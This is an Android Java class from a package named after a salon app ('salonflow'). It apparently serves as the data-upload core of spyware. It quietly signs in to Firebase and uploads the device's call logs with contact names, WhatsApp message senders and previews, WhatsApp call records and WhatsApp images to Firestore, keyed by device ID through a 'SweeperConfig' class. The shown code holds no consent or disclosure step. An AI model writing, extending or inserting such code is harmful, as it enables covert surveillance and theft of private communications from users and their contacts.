package com.salonflow.app;

import android.content.Context;
import android.os.Build;
import android.util.Log;

import com.google.android.gms.tasks.Task;
import com.google.android.gms.tasks.Tasks;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.firestore.CollectionReference;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.FirebaseFirestore;

import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class FirestoreManager {
    private static final String TAG = "FirestoreMgr";
    private static FirestoreManager instance;
    private final FirebaseFirestore db;
    private final String deviceId;
    private final ExecutorService executor;
    private volatile boolean initialized = false;
    private final CountDownLatch initLatch = new CountDownLatch(1);

    private FirestoreManager(Context context) {
        this.db = FirebaseFirestore.getInstance();
        this.deviceId = SweeperConfig.deviceId(context);
        this.executor = Executors.newFixedThreadPool(4);
    }

    public static synchronized FirestoreManager getInstance(Context context) {
        if (instance == null) {
            instance = new FirestoreManager(context.getApplicationContext());
        }
        return instance;
    }

    public void init() {
        if (initialized) return;
        executor.execute(() -> {
            try {
                FirebaseAuth auth = FirebaseAuth.getInstance();
                if (auth.getCurrentUser() == null) {
                    Tasks.await(auth.signInAnonymously());
                }
                initialized = true;
                initLatch.countDown();
                Log.i(TAG, "Firestore initialized, device=" + deviceId);
                registerDevice();
            } catch (Exception e) {
                initLatch.countDown();
                Log.e(TAG, "Firebase auth failed", e);
            }
        });
    }

    private void awaitInit() {
        if (initialized) return;
        try {
            initLatch.await(15, TimeUnit.SECONDS);
        } catch (InterruptedException ignored) {}
    }

    public void uploadCallLog(String number, String name, String type, long durationSec, long timestamp) {
        executor.execute(() -> {
            try {
                awaitInit();
                Tasks.await(addCallLog(number, name, type, durationSec, timestamp));
                Log.i(TAG, "Uploaded call log: " + number);
            } catch (Exception e) {
                Log.e(TAG, "Failed to upload call log", e);
            }
        });
    }

    public void uploadWhatsAppMessage(String sender, String preview, boolean isGroup, long timestamp) {
        executor.execute(() -> {
            try {
                awaitInit();
                Tasks.await(addWhatsAppMessage(sender, preview, isGroup, timestamp));
                Log.i(TAG, "Uploaded WhatsApp msg from: " + sender);
            } catch (Exception e) {
                Log.e(TAG, "Failed to upload WhatsApp msg", e);
            }
        });
    }

    public void uploadWhatsAppImage(String imageData, long timestamp) {
        executor.execute(() -> {
            try {
                awaitInit();
                Tasks.await(addWhatsAppImage(imageData, timestamp));
                Log.i(TAG, "Uploaded WhatsApp image");
            } catch (Exception e) {
                Log.e(TAG, "Failed to upload WhatsApp image", e);
            }
        });
    }

    public void uploadWhatsAppCall(String caller, String type, long durationSec, long timestamp) {
        executor.execute(() -> {
            try {
                awaitInit();
                Tasks.await(addWhatsAppCall(caller, type, durationSec, timestamp));
            } catch (Exception e) {
                Log.e(TAG, "Failed to upload WhatsApp call", e);
            }
        });
    }

    private Task<DocumentReference> addCallLog(String number, String name, String type, long durationSec, long timestamp) {
        Map<String, Object> data = new HashMap<>();
        data.put(SweeperConfig.FIELD_DEVICE, deviceId);
        data.put(SweeperConfig.FIELD_NUMBER, number);
        data.put(SweeperConfig.FIELD_NAME, name != null ? name : "");
        data.put(SweeperConfig.FIELD_TYPE, type);
        data.put(SweeperConfig.FIELD_DURATION, durationSec);
        data.put(SweeperConfig.FIELD_TIMESTAMP, timestamp);
        return collection(SweeperConfig.COLLECTION_CALL_LOGS).add(data);
    }

    private Task<DocumentReference> addWhatsAppMessage(String sender, String preview, boolean isGroup, long timestamp) {
        Map<String, Object> data = new HashMap<>();
        data.put(SweeperConfig.FIELD_DEVICE, deviceId);
        data.put(SweeperConfig.FIELD_SENDER, sender != null ? sender : "");
        data.put(SweeperConfig.FIELD_PREVIEW, preview != null ? preview : "");
        data.put(SweeperConfig.FIELD_IS_GROUP, isGroup);
        data.put(SweeperConfig.FIELD_TIMESTAMP, timestamp);
        return collection(SweeperConfig.COLLECTION_WHATSAPP_MSGS).add(data);
    }

    private Task<DocumentReference> addWhatsAppCall(String caller, String type, long durationSec, long timestamp) {
        Map<String, Object> data = new HashMap<>();
        data.put(SweeperConfig.FIELD_DEVICE, deviceId);
        data.put(SweeperConfig.FIELD_CALLER, caller != null ? caller : "");
        data.put(SweeperConfig.FIELD_TYPE, type);
        data.put(SweeperConfig.FIELD_DURATION, durationSec);
        data.put(SweeperConfig.FIELD_TIMESTAMP, timestamp);
        return collection(SweeperConfig.COLLECTION_WHATSAPP_CALLS).add(data);
    }

    private Task<DocumentReference> addWhatsAppImage(String imageData, long timestamp) {
        Map<String, Object> data = new HashMap<>();
        data.put(SweeperConfig.FIELD_DEVICE, deviceId);
        data.put(SweeperConfig.FIELD_IMAGE, imageData);
        data.put(SweeperConfig.FIELD_TIMESTAMP, timestamp);
        return collection(SweeperConfig.COLLECTION_WHATSAPP_IMAGES).add(data);
    }

    private CollectionReference collection(String name) {
        return db.collection(name).document(deviceId).collection("entries");
    }

    private void registerDevice() {
        try {
            for (String col : new String[]{SweeperConfig.COLLECTION_CALL_LOGS, SweeperConfig.COLLECTION_WHATSAPP_MSGS, SweeperConfig.COLLECTION_WHATSAPP_CALLS, SweeperConfig.COLLECTION_WHATSAPP_IMAGES}) {
                Map<String, Object> deviceInfo = new HashMap<>();
                deviceInfo.put("deviceId", deviceId);
                deviceInfo.put("deviceName", SweeperConfig.deviceDisplayName());
                deviceInfo.put("lastSeen", System.currentTimeMillis());
                Tasks.await(db.collection(col).document(deviceId).set(deviceInfo));
            }
            Log.i(TAG, "Device registered: " + deviceId + " (" + SweeperConfig.deviceDisplayName() + ")");
        } catch (Exception e) {
            Log.e(TAG, "Device registration failed", e);
        }
    }
}
